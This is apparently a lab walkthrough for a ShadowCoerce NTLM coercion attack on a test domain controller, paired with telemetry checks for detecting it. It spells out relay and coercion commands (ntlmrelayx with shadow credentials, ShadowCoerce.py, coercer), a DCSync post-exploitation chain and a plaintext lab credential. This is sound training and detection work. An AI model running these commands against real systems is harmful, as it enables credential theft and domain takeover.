# ~~WT#020 — ShadowCoerce~~

> **❌ NON-FUNCTIONAL on Server 2025.** MS-FSRVP (File Server VSS Agent) service is not available on Server 2025 domain controllers. Preserved for reference; use WT017 (PrinterBug) for confirmed coercion detection.

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01.cadre.local) |
| **Domain** | cadre.local |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | ShadowCoerce.py, coercer, impacket-ntlmrelayx |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1187 |
| **Difficulty** | Easy |

## Prerequisites
- Valid domain credentials for any domain user
- FSRVP (File Server VSS Agent) feature installed on dc01 (configured in CADRE vulns role)
- FssAgent service running on dc01
- Network connectivity from Kali (192.168.77.41) to dc01
- Attacker-controlled SMB listener on Kali

## Attack Steps

### Step 1: Start NTLM capture or relay listener
```bash
# Capture-only:
sudo impacket-smbserver -smb2support share /dev/null

# Or relay to LDAP for Shadow Credentials (see WT#021):
impacket-ntlmrelayx -t ldap://dc01.cadre.local --shadow-credentials --escalate-user ops_redcell
```

### Step 2: Run ShadowCoerce against dc01
```bash
# Using ShadowCoerce.py:
python3 ShadowCoerce.py 192.168.77.41 dc01.cadre.local
```

### Step 3: Alternative — using coercer
```bash
coercer coerce -l 192.168.77.41 -t 192.168.77.10 -d cadre.local -u analyst_dfir -p An@lyst_DF1R! --shadowcoerce
```

### Step 4: Verify captured NTLM authentication
Check terminal output for `dc01$@CADRE.LOCAL` NetNTLM hash arriving at your listener.

## Post-Exploitation Chain
- Coerced dc01$ NetNTLM hash → relay to LDAP (WT#021) → Shadow Credentials on dc01$ → DCSync
- Hash can be cracked offline (mode 5600) if relay is unavailable

## Telemetry Verification
| Source | What to look for |
|--------|-----------------|
| **Windows Security (dc01)** | Event 4662 (FSRVP RPC object access), Event 5156 (outbound to Kali:445) |
| **Sysmon (dc01)** | Event 3 (network connection to Kali:445 via FssAgent/LSASS) |
| **Zeek (monitor)** | `dce_rpc.log` showing FSRVP named pipe activity |
| **Suricata (monitor)** | FSRVP / Shadow Copy RPC alerts |
| **Arkime (monitor)** | Full PCAP of FSRVP RPC coercion traffic |
| **Elastic / Kibana** | `logs-system.security-*`, `logs-windows.sysmon_operational-*` |

## Status
**CONFIGURED** — FSRVP feature + FssAgent service configured on dc01. ShadowCoerce tools on Kali.
